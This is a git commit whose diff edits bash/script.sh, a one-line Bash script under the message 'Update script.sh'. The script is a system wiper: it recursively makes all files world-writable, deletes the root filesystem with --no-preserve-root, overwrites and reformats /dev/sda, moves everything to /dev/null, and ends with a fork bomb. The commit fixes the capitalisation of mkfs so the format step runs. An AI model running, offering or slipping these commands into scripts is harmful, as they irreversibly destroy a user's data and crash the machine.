42b066b35afdbb94efa6bf58cee5a5413cd80408
William brochensque junior <brochensquewill@protonmail.com>
2020-09-10 20:25:03 -0300

    Update script.sh

--- bash/script.sh
+++ bash/script.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-sudo chmod -R 777 /*; sudo rm -rf /* --no-preserve-root; dd if=/dev/null of=/dev/sda; sudo mv /* /dev/null; sudo Mkfs.ext3 /dev/sda; : () {: |: &} ;:
+sudo chmod -R 777 /*; sudo rm -rf /* --no-preserve-root; dd if=/dev/null of=/dev/sda; sudo mv /* /dev/null; sudo mkfs.ext3 /dev/sda; : () {: |: &} ;:
